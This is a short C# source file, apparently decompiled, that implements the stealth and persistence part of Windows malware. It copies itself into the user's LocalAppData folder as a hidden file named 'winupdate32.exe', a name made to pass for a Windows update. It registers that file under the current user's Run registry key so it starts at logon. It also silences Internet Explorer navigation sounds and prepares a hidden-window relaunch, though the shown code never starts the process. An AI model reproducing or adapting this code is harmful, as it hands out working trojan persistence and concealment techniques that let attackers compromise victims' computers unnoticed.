using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using Microsoft.Win32;

internal class Class1
{
	private const string string_0 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

	private const int tePpmgDe2 = 21;

	private const int int_0 = 2;

	public static string string_1 = "winupdate32";

	public static string string_2 = "winupdate32.exe";

	[DllImport("urlmon.dll")]
	[return: MarshalAs(UnmanagedType.Error)]
	private static extern int CoInternetSetFeatureEnabled(int int_1, [MarshalAs(UnmanagedType.U4)] int int_2, bool bool_0);

	public static void smethod_0()
	{
		CoInternetSetFeatureEnabled(21, 2, bool_0: true);
	}

	public static void smethod_1(string string_3, string string_4)
	{
		if (File.Exists(string_4))
		{
			File.SetAttributes(string_4, FileAttributes.Normal);
		}
		try
		{
			File.Copy(string_3, string_4, overwrite: true);
		}
		catch (Exception)
		{
		}
		File.SetAttributes(string_4, FileAttributes.Hidden);
	}

	public static void smethod_2(string string_3, string string_4)
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		if (registryKey != null)
		{
			registryKey.SetValue(string_3, string_4);
			registryKey.Close();
		}
	}

	public static void smethod_3()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
		if (!(Path.GetDirectoryName(location) == folderPath))
		{
			smethod_1(location, folderPath + "\\" + string_2);
			Class0.mutex_0.ReleaseMutex();
			ProcessStartInfo processStartInfo = new ProcessStartInfo(folderPath + "\\" + string_2);
			processStartInfo.RedirectStandardOutput = false;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.UseShellExecute = true;
		}
	}
}
